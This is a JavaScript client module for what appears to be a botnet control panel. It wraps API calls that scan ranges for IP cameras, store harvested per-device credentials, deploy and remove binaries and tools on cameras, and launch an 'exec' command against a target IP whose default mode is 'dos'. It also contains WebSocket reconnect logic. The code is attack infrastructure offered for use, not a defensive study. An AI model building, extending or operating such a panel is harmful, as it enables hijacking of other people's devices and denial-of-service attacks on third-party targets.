import { CONFIG } from './config.js';

class LiveClient {
  constructor() {
    this.mode = 'live';
    this._listeners = new Set();
    this._ws = null;
    this._backoff = 1000;
    this._stopped = false;
    this._retryT = null;
  }

  async _post(path, body) {
    const res = await fetch(CONFIG.apiBase + path, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
    return res.json();
  }

  async _get(path) {
    const res = await fetch(CONFIG.apiBase + path);
    return res.json();
  }

  async _delete(path) {
    const res = await fetch(CONFIG.apiBase + path, { method: 'DELETE' });
    return res.json();
  }

  health()       { return this._get('/health'); }
  status()       { return this._get('/status'); }
  cameras()      { return this._get('/cameras'); }
  credentials()  { return this._get('/credentials'); }

  scanStart(scanRange) { return this._post('/scan/start', { scan_range: scanRange }); }
  scanStop()           { return this._post('/scan/stop', {}); }

  connect(cameras) { return this._post('/connect', { cameras }); }
  disconnect(ip)   { return this._post('/disconnect', { ip: ip || '' }); }

  checkBinary(ips)                 { return this._post('/check-binary', { ips }); }
  deploy(ips, filename)            { return this._post('/deploy', { ips, filename }); }
  deployTools(ips)                 { return this._post('/deploy-tools', { ips }); }
  deleteBinary(ips, filename)      { return this._post('/delete-binary', { ips, filename }); }
  deleteTools(ips)                 { return this._post('/delete-tools', { ips }); }

  exec(ips, targetIp, args, mode)  { return this._post('/exec', { ips, target_ip: targetIp, args, mode: mode || 'dos' }); }
  execStop(ips)                    { return this._post('/exec/stop', { ips: ips || undefined }); }

  saveCred(entry)                  { return this._post('/credentials', { entry }); }
  saveCredBatch(entries)           { return this._post('/credentials/batch', { entries }); }
  deleteCred(ip)                   { return this._delete('/credentials/' + encodeURIComponent(ip)); }

  onEvent(cb) { this._listeners.add(cb); return () => this._listeners.delete(cb); }
  _emit(msg)  { this._listeners.forEach(cb => cb(msg)); }

  connectStream() {
    const url = (location.protocol === 'https:' ? 'wss://' : 'ws://') + location.host + CONFIG.streamPath;
    const open = () => {
      if (this._stopped) return;
      try {
        this._ws = new WebSocket(url);
        this._ws.onopen = () => {
          this._backoff = 1000;
          this._emit({ type: 'status', module: '_conn', state: 'up' });
        };
        this._ws.onmessage = (e) => {
          let msg; try { msg = JSON.parse(e.data); } catch { return; }
          this._emit(msg);
        };
        this._ws.onerror = () => { try { this._ws.close(); } catch {} };
        this._ws.onclose = () => {
          this._emit({ type: 'status', module: '_conn', state: 'down' });
          this._scheduleReconnect(open);
        };
      } catch {
        this._scheduleReconnect(open);
      }
    };
    open();
  }

  _scheduleReconnect(open) {
    if (this._stopped) return;
    clearTimeout(this._retryT);
    const delay = this._backoff;
    this._backoff = Math.min(delay * 2, 15000);
    this._retryT = setTimeout(open, delay);
  }

  disconnect_ws() {
    this._stopped = true;
    clearTimeout(this._retryT);
    try { this._ws?.close(); } catch {}
  }
}

export async function createClient() {
  const client = new LiveClient();
  try {
    const r = await fetch(CONFIG.apiBase + '/health', { signal: AbortSignal.timeout(CONFIG.healthTimeoutMs) });
    if (r.ok) return client;
  } catch {}
  return client;
}
